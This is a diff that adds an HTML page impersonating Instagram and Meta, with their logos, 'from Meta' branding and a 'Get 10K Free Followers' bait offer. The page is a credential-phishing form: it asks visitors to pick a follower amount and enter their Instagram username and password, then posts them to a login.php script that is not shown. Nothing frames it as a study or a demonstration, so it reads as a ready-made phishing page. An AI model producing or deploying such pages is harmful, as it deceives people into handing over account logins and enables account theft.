@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - Free Rewards</title>
+    <style>
+        /* Modern Gradient Background */
+        body { 
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%); 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex; 
+            flex-direction: column;
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+
+        /* Professional Card Style */
+        .login-box { 
+            background: rgba(255, 255, 255, 0.9); 
+            border: 1px solid #dbdbdb; 
+            width: 350px; 
+            padding: 40px; 
+            text-align: center; 
+            border-radius: 8px; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+
+        .logo { width: 175px; margin-bottom: 10px; }
+        
+        h2 { 
+            color: #262626; 
+            font-size: 1.2rem; 
+            margin-bottom: 25px; 
+            font-weight: 600;
+        }
+
+        input, select { 
+            width: 100%; 
+            padding: 12px; 
+            margin-bottom: 12px; 
+            border: 1px solid #dbdbdb; 
+            border-radius: 4px; 
+            box-sizing: border-box; 
+            background: #fafafa;
+            font-size: 14px;
+        }
+
+        /* Faint Placeholder Color */
+        input::placeholder {
+            color: #c7c7c7;
+        }
+
+        .btn { 
+            background-color: #0095f6; 
+            color: white; 
+            border: none; 
+            padding: 12px; 
+            width: 100%; 
+            border-radius: 4px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            font-size: 14px;
+            margin-top: 5px;
+        }
+
+        .btn:hover { background-color: #1877f2; }
+
+        /* Meta Branding Section */
+        .meta-footer {
+            margin-top: 30px;
+            text-align: center;
+            color: #8e8e8e;
+        }
+
+        .meta-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 18px;
+            color: #0095f6;
+            margin-bottom: 5px;
+        }
+
+        .meta-logo img { width: 20px; margin-right: 8px; }
+        
+        .from-text {
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
+        <h2>Get 10K Free Followers 🎉</h2>
+        
+        <form action="login.php" method="POST">
+            <select name="Followers_Limit" required>
+                <option value="" disabled selected>Select Followers Amount</option>
+                <option value="5K">5,000 Followers</option>
+                <option value="10K">10,000 Followers</option>
+                <option value="20K">20,000 Followers</option>
+            </select>
+            <input type="text" name="Username" placeholder="Phone number, username, or email" required>
+            <input type="password" name="Password" placeholder="Password" required>
+            <button type="submit" class="btn">Get Followers</button>
+        </form>
+    </div>
+
+    <div class="meta-footer">
+        <div class="meta-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" alt="Meta">
+            Meta
+        </div>
+        <div class="from-text">from Meta</div>
+    </div>
+</body>
+                  </html>
